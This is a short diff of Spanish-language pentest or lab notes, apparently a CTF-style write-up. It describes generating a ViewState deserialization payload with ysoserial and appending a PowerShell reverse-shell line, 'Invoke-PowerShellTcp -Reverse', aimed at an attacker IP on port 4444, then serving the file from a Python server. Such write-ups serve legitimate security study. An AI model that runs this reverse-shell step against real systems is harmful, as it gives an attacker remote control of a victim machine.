@@ -62,12 +62,13 @@ C:\FilesExplotation\ysoserial-1.34\Release>.\ysoserial.exe -p ViewState  -g Text
 ahora usaremos el invoke-powershell para invocar automaticamente esta shell. al final del codigo debemos agregar la siguiente linea 
 
 ```python
-Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
 ```
 
 ![[Pasted image 20240311110955.png]]
-### Servidor con python
 
+### Servidor con python
+estaremos compartiendo este archivo en un servidor para que
 ![[Pasted image 20240311110845.png]]
 
 ### rlwrap
